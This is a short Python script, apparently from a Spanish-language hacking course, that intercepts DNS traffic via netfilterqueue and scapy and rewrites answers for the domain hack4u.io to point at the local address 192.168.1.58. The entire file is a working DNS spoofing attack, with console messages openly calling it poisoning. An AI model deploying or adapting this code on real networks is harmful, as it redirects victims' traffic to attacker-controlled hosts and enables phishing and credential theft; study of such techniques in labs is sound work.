#!/usr/bin/env pyrhon3

import netfilterqueue
import scapy.all as scapy
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"[!] Saliendo del programa...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if b"hack4u.io" in qname:
            print(colored(f"\n[+] Envenendando el dominio hack4u.io", 'yellow'))

            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.58")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(scapy_packet.build())

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
